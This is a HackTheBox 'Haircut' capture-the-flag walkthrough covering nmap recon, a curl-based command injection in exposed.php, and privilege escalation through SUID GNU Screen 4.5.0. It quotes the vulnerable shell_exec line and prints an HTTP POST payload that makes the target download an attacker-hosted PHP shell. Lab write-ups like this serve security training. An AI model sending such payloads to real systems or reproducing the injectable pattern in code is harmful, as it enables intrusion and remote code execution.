# Haircut

## Information Gathering

Running nmap
```
root@kali:~/hackthebox/Haircut# cat nmap/haircut.nmap
# Nmap 7.70 scan initiated Fri Jul 19 03:02:01 2019 as: nmap -sC -sV -oA nmap/haircut 10.10.10.24
Nmap scan report for 10.10.10.24
Host is up (0.080s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
80/tcp open  http    nginx 1.10.0 (Ubuntu)
|_http-server-header: nginx/1.10.0 (Ubuntu)
|_http-title:  HTB Hairdresser
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
We can see web server on port 80.
Dirbuster shows interesting /exposed.php page which is vulnerable to command injection.

## Exploitation

It runs curl and allows us to save a file by using -o key:
```
echo shell_exec("curl ".$userurl." 2>&1");  
```
```
POST /exposed.php HTTP/1.1
Host: 10.10.10.24

formurl=http://10.10.14.6:8000/t.php -o "uploads/t.php"&submit=Go
```
Now we have a shell.

## PrivEsc
LinEnum shows the list SUID files with screen-4.5.0
```
[-] SUID files:                                                                                                                                              
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g                                                                                                      
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6                                                                                                         
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount                                                                                                    
-rwsr-xr-x 1 root root 40128 May  4  2017 /bin/su                                                                                                            
-rwsr-xr-x 1 root root 40152 Dec 16  2016 /bin/mount                                                                                                         
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping                                                                                                          
-rwsr-xr-x 1 root root 27608 Dec 16  2016 /bin/umount                                                                                                        
-rwsr-xr-x 1 root root 136808 Jan 20  2017 /usr/bin/sudo                                                                                                     
-rwsr-xr-x 1 root root 23376 Jan 18  2016 /usr/bin/pkexec                                                                                                    
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newuidmap                                                                                                 
-rwsr-xr-x 1 root root 39904 May  4  2017 /usr/bin/newgrp                                                                                                    
-rwsr-xr-x 1 root root 32944 May  4  2017 /usr/bin/newgidmap                                                                                                 
-rwsr-xr-x 1 root root 75304 May  4  2017 /usr/bin/gpasswd                                                                                                   
-rwsr-sr-x 1 daemon daemon 51464 Jan 14  2016 /usr/bin/at                                                                           
-rwsr-xr-x 1 root root 54256 May  4  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 1588648 May 19  2017 /usr/bin/screen-4.5.0                
-rwsr-xr-x 1 root root 40432 May  4  2017 /usr/bin/chsh       
-rwsr-xr-x 1 root root 49584 May  4  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 38984 Mar  7  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 208680 Apr 29  2017 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 14864 Jan 18  2016 /usr/lib/policykit-1/polkit-agent-helper-1
```
which is vulnerable to PrivEsc exploit
```
root@kali:~/hackthebox/Haircut# searchsploit screen 4.5.0
--------------------------------------------------------------------------------
 Exploit Title                                      |  Path
                                                    | (/usr/share/exploitdb/)
-------------------------------------------------------------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation       | exploits/linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC) | exploits/linux/local/41152.txt
-------------------------------------------------------------------------------------
```
Run exploit and get root shell.
